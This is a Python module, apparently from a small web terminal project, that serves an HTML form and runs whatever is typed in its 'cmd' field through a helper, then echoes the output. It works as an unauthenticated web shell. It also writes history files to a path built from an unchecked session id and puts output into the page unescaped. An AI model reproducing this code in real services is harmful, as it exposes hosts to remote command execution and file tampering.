import env
import traitant
import utility
from constant import *


def render(recvstr):
    cmdres = ""
    data = ""
    session_id = ""
    if recvstr.find("POST") == 0:
        data, session_id = traitant.retrieve_form_data(recvstr)
        print("session id:", session_id)
        cmdres = env.histories[session_id]
        print("CMD RES LEN 1 :", len(cmdres))

    elif recvstr.find("GET") == 0:
        session_id = utility.generate_session_code(SESSION_ID_LENGTH)
        if session_id not in env.histories.keys():
            env.histories[session_id] = ""
    print(data)

    try:
        d = traitant.run_commands(data)
        # print(d)
        cmdres += d.replace("\n", "<br>")
    except Exception as ex:
        print(ex.args)

    sss = """HTTP/1.0 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n
    <body>
    <br />
    """
    sss += "\r\n" + cmdres
    sss += """
    <br />
    <form action='' method="post">
    <input type="text" name="cmd" class="cmdinput" value='' />
    <input type="hidden" name="session" value='"""
    sss += session_id
    sss += """' />
    <input type="submit" class="cmdbutton" value="Exec" />
    </form>
    </body>
    """
    env.histories[session_id] = cmdres
    f1 = open(SESSION_FILES_PATH + "history_session" + session_id + ".txt", "w")
    f1.write(cmdres)
    f1.close()
    return sss
